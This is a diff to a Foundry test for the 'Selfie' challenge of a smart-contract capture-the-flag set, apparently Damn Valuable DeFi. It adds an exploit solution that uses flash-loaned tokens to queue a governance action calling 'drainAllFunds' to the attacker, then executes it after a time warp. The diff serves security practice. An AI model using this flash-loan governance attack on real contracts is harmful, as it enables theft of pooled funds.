@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {SelfieExploit} from "../../../src/Contracts/selfie/SelfieExploit.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -45,6 +46,27 @@ contract Selfie is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        vm.startPrank(attacker);
+        SelfieExploit selfieExploit = new SelfieExploit(
+            address(simpleGovernance),
+            address(selfiePool),
+            address(dvtSnapshot)
+        );
+        bytes memory data = abi.encodeWithSignature(
+            "drainAllFunds(address)",
+            attacker
+        );
+
+        uint256 actionId = selfieExploit.exploit(
+            address(selfiePool),
+            TOKENS_IN_POOL, //flashloan amount
+            data
+        );
+        vm.stopPrank();
+        vm.warp(block.timestamp + 2 days);
+
+        simpleGovernance.executeAction(actionId);
 
         /** EXPLOIT END **/
         validation();
